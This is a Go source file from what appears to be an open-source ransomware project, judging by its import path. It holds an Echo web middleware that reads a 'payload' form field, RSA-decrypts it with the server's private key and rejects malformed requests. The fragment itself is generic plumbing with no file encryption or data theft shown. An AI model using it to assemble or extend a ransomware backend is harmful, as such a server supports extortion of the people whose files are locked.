package web

import (
	"net/http"

	"github.com/labstack/echo"
	"github.com/mauri870/ransomware/rsa"
)

// DecryptPayloadMiddleware try to decrypt the payload from request
func (e *Engine) DecryptPayloadMiddleware(next echo.HandlerFunc) echo.HandlerFunc {
	return func(c echo.Context) error {
		// Retrieve the payload from request
		payload := c.FormValue("payload")
		if payload == "" {
			return c.JSON(http.StatusUnprocessableEntity, ApiResponseNoPayload)
		}

		// Decrypt the payload
		jsonPayload, err := rsa.Decrypt(e.PrivateKey, []byte(payload))
		if err != nil {
			c.Logger().Print("Bad payload encryption, rejecting...\n")
			return c.JSON(http.StatusUnprocessableEntity, ApiResponseBadRSAEncryption)
		}

		c.Set("payload", jsonPayload)
		return next(c)
	}
}
